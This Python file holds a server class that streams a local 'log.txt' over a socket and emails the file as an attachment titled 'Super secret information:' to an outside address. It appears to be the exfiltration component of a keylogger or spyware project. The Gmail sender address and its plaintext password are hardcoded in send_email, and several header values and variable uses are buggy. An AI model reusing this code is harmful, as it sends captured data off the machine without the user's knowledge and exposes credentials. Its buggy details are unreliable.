import socket,os,logging,smtplib
from threading import Thread, Lock

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders


class Server():

    def __init__(self,lock):

        self.listen = True
        self.BUFFER_SIZE = 10
        self.filename = "log.txt"
        self.filesize = os.path.getsize(self.filename)
        self.lock = lock
        self.serverThread = Thread(target = self.serverSocket)
        self.serverThread.start()

        self.logger = logging.getLogger(__name__)
        self.logger.setLevel(logging.INFO)
            
        formatter = logging.Formatter('%(levelname)s:%(name)s:%(message)s')
        file_handler = logging.FileHandler('information.log')
        file_handler.setFormatter(formatter)

        self.logger.addHandler(file_handler)
                    
    
    def serverSocket(self):

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        HOST = '127.0.0.1'
        PORT = 12346
        s.bind((HOST, PORT))
        self.logger.info("Bound into host {}, on port {}\n".format(HOST,PORT))
        
        s.listen(5)
        self.flag = 0

        while True:
            if self.listen == False:
                break
            try:
                clt, addr = s.accept()
               	self.logger.info("Connected to: {}\n{}\n".format(clt,addr))
                flag = 1
            except ValueError:
                print("Error in {} {}".format(clt,addr))
            else:
                print("Connected to: {}".format(addr))
                sendingThread = Thread(target = self.send_file, args = (clt,))
                sendingThread.start()

        if flag == 1:
            s.close()

    
    def send_file(self,clt):

        self.lock.acquire()
        with open(self.filename, "r") as f:
            assert self.BUFFER_SIZE > 0
            total = 0
            while True:
                bytes_read = f.read(self.BUFFER_SIZE)
                total += len(bytes_read)
                if bytes_read == '':
                    break
                clt.send(bytes(bytes_read,"utf-8"))
                self.show_percentage(total/self.filesize)
            clt.send(bytes("STOPSEQUENCE","utf-8"))
        f.close()
        self.lock.release()


    def send_email(self):
        sender_addr = 'aggelosanagnostopoulos1@gmail.com'
        sender_pass = 'eimaigamatos123'
        receiver_addr = 'up1066593@upnet.gr'
        
        content = ''
        message = MIMEMultipart()
        message['From'] = sender_addr
        message['To'] = receiver_addr
        message['Subject'] = 'Super secret information:'
        message.attach(MIMEText(content, 'plain'))
        attach_file = open(self.filename, 'rb')
        payload = MIMEBase('application', 'octate-stream')
        payload.set_payload((attach_file).read())
        encoders.encode_base64(payload)
        payload.add_header('Content-Decomposition', 'attachment', filename=self.filename)
        message.attach(payload)

        session = smtplib.SMTP('smtp.gmail.com',587)
        session.starttls()
        session.login(sender_addr,sender_pass)
        text = message.as_string()
        session.sendmail(sender_addr,receiver_addr,text)
        session.quit()
 

    def show_percentage(self,p):

        chops = 40
        if p > 1 or p < 0:
            print()
            return
        if p > 0.0:
            print('\r', end = '')

        s = int(p * chops)
        print('[{}]  {:5.2f}%'.format('=' * max(0, s-1) + ('>' if s > 0 else '') + ' ' * (chops - s), p*100), end = ('\n' if p == 1.0 else ''))


    def kill(self):
        self.listen = False
